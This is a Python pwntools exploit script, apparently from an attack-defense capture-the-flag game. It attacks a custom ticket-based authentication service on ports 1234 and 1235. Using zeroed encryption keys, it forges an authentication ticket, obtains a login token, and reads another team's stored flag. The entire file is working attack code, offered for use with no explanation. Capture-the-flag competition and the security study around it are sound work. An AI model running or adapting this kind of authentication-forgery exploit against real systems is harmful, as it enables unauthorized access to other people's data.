#!/usr/bin/env python3

from pwn import *
from service2client import Client
from Crypto.Cipher import ChaCha20
import authlib
import os
import sys
from hashlib import sha256

context.log_level = "error"


def stream_encrypt(x):
    cipher = ChaCha20.new(key=b"0"*32, nonce=b"12345678")
    return cipher.encrypt(x).hex().upper()


def exploit(ip, flag_id):
    r = remote(ip, 1234)
    r.recvline()
    r.sendline("HELLO")
    r.recvline()
    r.sendline("AUTH")
    r.recvline()
    r.sendline(flag_id)
    r.recvline()
    r.sendline(stream_encrypt(b"0|0|0|0"))
    r.recvline()
    r.sendline(stream_encrypt(b"0|0"))
    token = r.recvline().strip().decode()
    shared_key = sha256(b"0").hexdigest().upper()
    r.close()

    token_client = authlib.TicketClient(flag_id, "1", token, shared_key)
    user_token = token_client.get_user_token()

    r = remote(ip, 1234)
    r.recvline()
    r.sendline("HELLO")
    r.recvline()
    r.sendline("TOKEN")
    r.recvline()
    r.sendline(user_token.encode() + b"." + token.encode())
    key_token, service_token = r.recvline().strip().decode().split(".")
    login_token = token_client.finalize_token(key_token, service_token)
    r.close()

    r = remote(ip, 1235)
    r.recvuntil(": ")
    r.sendline(login_token)
    r.recvuntil("Exit\n")
    r.sendline("3")
    r.recvuntil(": ")
    r.sendline("0")
    r.recvline()
    return r.recvline(False).split()[-1].decode()


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
